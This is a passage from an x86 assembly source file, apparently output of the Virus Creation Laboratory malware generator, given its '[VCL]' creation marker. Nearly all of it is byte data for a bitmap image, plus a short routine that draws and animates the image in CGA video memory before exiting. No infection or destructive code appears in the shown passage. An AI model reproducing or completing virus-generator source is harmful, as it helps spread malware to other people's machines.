		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 000h
		db      000h, 02Ah, 0AAh, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 028h, 000h, 02Ah, 0AAh
		db      0AAh, 0A0h, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 000h, 002h, 0AAh, 0AAh, 000h, 000h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 02Ah, 0A8h, 000h
		db      000h, 000h, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0AAh, 080h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 000h
		db      000h, 02Ah, 0AAh, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 02Ah, 0A0h, 000h, 0AAh
		db      0AAh, 0AAh, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 000h, 02Ah, 0AAh, 0A0h, 000h, 000h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 02Ah, 0AAh, 080h
		db      000h, 000h, 0AAh, 0AAh, 0A8h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 000h
		db      000h, 0AAh, 0AAh, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 02Ah, 0AAh, 000h, 002h
		db      0AAh, 0AAh, 0AAh, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0AAh, 080h, 000h, 000h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 00Ah, 0AAh, 0A0h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 000h
		db      002h, 0AAh, 0A8h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 02Ah, 0AAh, 000h, 000h
		db      00Ah, 0AAh, 0AAh, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 00Ah, 0AAh, 0A8h, 000h, 000h, 000h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 002h, 0AAh, 0A8h
		db      000h, 000h, 02Ah, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      0A0h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 000h
		db      02Ah, 0AAh, 0A0h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 02Ah, 0AAh, 000h, 000h
		db      000h, 02Ah, 0AAh, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 0AAh, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 000h, 02Ah, 0AAh
		db      080h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 02Ah
		db      0AAh, 0AAh, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 02Ah, 0AAh, 000h, 000h
		db      000h, 000h, 0AAh, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 002h, 0AAh, 0AAh, 000h, 000h, 000h, 000h
		db      000h, 000h, 00Ah, 0AAh, 0A0h, 000h, 002h, 0AAh
		db      0A8h, 000h, 002h, 0AAh, 0A0h, 000h, 00Ah, 0AAh
		db      0A0h, 000h, 000h, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 080h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 0AAh, 0AAh
		db      0AAh, 0A0h, 000h, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 02Ah, 0AAh, 000h, 000h
		db      000h, 000h, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 02Ah, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      0A0h, 000h, 002h, 0AAh, 0AAh, 000h, 02Ah, 0AAh
		db      0A0h, 000h, 002h, 0AAh, 0A0h, 000h, 002h, 0AAh
		db      0A8h, 000h, 000h, 00Ah, 0AAh, 0A0h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 0AAh, 0AAh
		db      0A8h, 000h, 000h, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 02Ah, 0AAh, 000h, 000h
		db      000h, 000h, 000h, 02Ah, 080h, 000h, 000h, 000h
		db      000h, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      0A0h, 000h, 000h, 02Ah, 0AAh, 000h, 02Ah, 0AAh
		db      000h, 000h, 002h, 0AAh, 0A0h, 000h, 000h, 02Ah
		db      0AAh, 080h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 0AAh, 0A0h
		db      000h, 000h, 000h, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 02Ah, 0AAh, 000h, 000h
		db      000h, 000h, 000h, 000h, 080h, 000h, 000h, 000h
		db      00Ah, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      0A0h, 000h, 000h, 000h, 02Ah, 000h, 02Ah, 000h
		db      000h, 000h, 002h, 0AAh, 0A0h, 000h, 000h, 00Ah
		db      0AAh, 0A0h, 000h, 000h, 000h, 00Ah, 0A8h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 00Ah, 0AAh, 0A8h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 0AAh, 0AAh
		db      080h, 000h, 000h, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 028h, 000h, 000h, 000h
		db      000h, 000h, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      002h, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      0A0h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 000h, 000h, 00Ah
		db      0AAh, 0A0h, 000h, 000h, 02Ah, 0AAh, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 0AAh, 0AAh
		db      0AAh, 080h, 000h, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 02Ah, 0A0h, 000h, 000h
		db      000h, 000h, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      002h, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      080h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 000h, 000h, 0AAh
		db      0AAh, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 0AAh, 0AAh
		db      0AAh, 0A8h, 000h, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 02Ah, 0AAh, 080h, 000h
		db      000h, 000h, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      002h, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0A8h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 000h, 002h, 0AAh
		db      0A8h, 000h, 000h, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      080h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 002h
		db      0AAh, 0AAh, 080h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 02Ah, 0AAh, 0AAh, 000h
		db      000h, 000h, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 000h, 000h, 0AAh
		db      080h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 000h
		db      00Ah, 0AAh, 0A0h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 00Ah, 0AAh, 0AAh, 0A0h
		db      000h, 000h, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 002h, 0AAh, 0AAh, 000h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 000h, 000h, 02Ah
		db      000h, 000h, 02Ah, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0AAh, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 000h
		db      000h, 0AAh, 0A8h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 02Ah, 0AAh, 0AAh
		db      080h, 000h, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 02Ah, 0AAh, 0A0h, 000h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 002h, 080h, 000h
		db      000h, 000h, 0AAh, 0AAh, 0A8h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 000h
		db      000h, 02Ah, 0AAh, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 020h, 000h, 0AAh, 0AAh
		db      0AAh, 000h, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 0AAh, 0AAh, 080h, 000h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 02Ah, 0A8h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 000h
		db      000h, 02Ah, 0AAh, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 02Ah, 000h, 002h, 0AAh
		db      0AAh, 0A8h, 00Ah, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 000h, 00Ah, 0AAh, 0A8h, 000h, 000h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 0AAh, 0AAh, 000h
		db      000h, 000h, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      0A8h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 000h
		db      000h, 02Ah, 0AAh, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 02Ah, 0A8h, 000h, 00Ah
		db      0AAh, 0AAh, 0AAh, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0AAh, 080h, 000h, 000h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 02Ah, 0AAh, 080h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 000h
		db      000h, 0AAh, 0A8h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 02Ah, 0AAh, 000h, 000h
		db      0AAh, 0AAh, 0AAh, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 002h, 0AAh, 0AAh, 000h, 000h, 000h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 002h, 0AAh, 0A8h
		db      000h, 000h, 02Ah, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0AAh, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 000h
		db      00Ah, 0AAh, 0A0h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 02Ah, 0AAh, 000h, 000h
		db      002h, 0AAh, 0AAh, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 02Ah, 0AAh, 0A0h, 000h, 000h, 000h
		db      000h, 000h, 02Ah, 0AAh, 000h, 000h, 000h, 02Ah
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 000h, 0AAh, 0AAh
		db      000h, 000h, 00Ah, 0AAh, 0A8h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 000h, 002h
		db      0AAh, 0AAh, 080h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 02Ah, 0AAh, 000h, 000h
		db      000h, 00Ah, 0AAh, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 0AAh, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 000h, 02Ah, 0AAh, 080h, 000h, 000h, 0AAh
		db      0AAh, 000h, 002h, 0AAh, 0A0h, 000h, 02Ah, 0AAh
		db      080h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 0AAh, 0AAh
		db      0AAh, 0A8h, 000h, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 02Ah, 0AAh, 000h, 000h
		db      000h, 000h, 02Ah, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 00Ah, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      0A0h, 000h, 00Ah, 0AAh, 0AAh, 000h, 02Ah, 0AAh
		db      0A8h, 000h, 002h, 0AAh, 0A0h, 000h, 002h, 0AAh
		db      0A8h, 000h, 000h, 02Ah, 0AAh, 0AAh, 0AAh, 0AAh
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 0AAh, 0AAh
		db      0AAh, 080h, 000h, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 02Ah, 0AAh, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 080h, 000h, 000h, 000h
		db      000h, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      0A0h, 000h, 000h, 0AAh, 0AAh, 000h, 02Ah, 0AAh
		db      080h, 000h, 002h, 0AAh, 0A0h, 000h, 000h, 0AAh
		db      0AAh, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db      000h, 000h, 000h, 0AAh, 0A8h, 000h, 0AAh, 0AAh
		db      080h, 000h, 000h, 000h, 00Ah, 0AAh, 0AAh, 0AAh
		db      0AAh, 0AAh, 0A0h, 000h, 02Ah, 0AAh, 000h, 000h
		db      000h, 000h, 000h, 002h, 080h, 000h, 000h, 000h
		db      002h, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh, 0AAh
		db      0A0h, 000h, 000h, 002h, 0AAh, 000h, 02Ah, 0A0h
		db      000h, 000h, 002h, 0AAh, 0A0h, 000h, 000h, 02Ah
		db      0AAh, 080h, 000h, 000h, 002h, 0AAh, 0AAh, 0AAh
		db      0A0h, 000h, 000h, 000h, 000h, 000h, 000h, 00Eh
		db      01Fh, 0B8h, 005h, 000h, 0CDh, 010h, 0B8h, 000h
		db      0B8h, 08Eh, 0C0h, 0E8h, 022h, 000h, 0B9h, 010h
		db      000h, 0BFh, 090h, 00Bh, 0E8h, 032h, 000h, 0BFh
		db      040h, 030h, 0E8h, 055h, 000h, 0E2h, 0F2h, 0B9h
		db      0FFh, 0FFh, 0E2h, 0FEh, 0B9h, 0FFh, 0FFh, 0E2h
		db      0FEh, 0B8h, 003h, 000h, 0CDh, 010h, 0CDh, 020h
		db      08Dh, 036h, 0F7h, 006h, 0BFh, 090h, 00Bh, 0B9h
		db      000h, 005h, 0F3h, 0A4h, 08Dh, 036h, 0F7h, 00Bh
		db      0BFh, 040h, 02Bh, 0B9h, 000h, 005h, 0F3h, 0A4h
		db      0C3h, 051h, 0FCh, 032h, 0D2h, 0BEh, 010h, 000h
		db      0B9h, 028h, 000h, 026h, 08Bh, 005h, 086h, 0C4h
		db      0D1h, 0C8h, 0D1h, 0C8h, 08Ah, 0F4h, 080h, 0E6h
		db      0C0h, 080h, 0E4h, 03Fh, 00Ah, 0E2h, 08Ah, 0D6h
		db      086h, 0C4h, 0ABh, 0E2h, 0E6h, 04Eh, 075h, 0E0h
		db      059h, 0C3h, 051h, 0FDh, 032h, 0D2h, 0BEh, 010h
		db      000h, 0B9h, 028h, 000h, 026h, 08Bh, 005h, 086h
		db      0C4h, 0D1h, 0C0h, 0D1h, 0C0h, 08Ah, 0F0h, 080h
		db      0E6h, 003h, 024h, 0FCh, 00Ah, 0C2h, 08Ah, 0D6h
		db      086h, 0C4h, 0ABh, 0E2h, 0E7h, 04Eh, 075h, 0E1h
		db      059h, 0FCh, 0C3h, 08Dh, 086h, 0DEh, 0FEh, 050h
		db      0E8h, 01Dh, 01Ah, 083h, 0C4h, 004h, 08Dh, 086h
		db      030h, 0FFh, 050h, 0E8h, 00Bh, 001h, 083h, 0C4h
		db      002h, 089h, 046h, 082h, 08Dh, 086h, 0DEh, 0FEh
		db      050h, 0E8h, 0FDh, 000h, 083h, 0C4h, 002h, 089h
		db      046h, 080h
vcl_marker      db      "[VCL]",0               ; VCL creation marker

finish          label   near

code            ends
		end     main
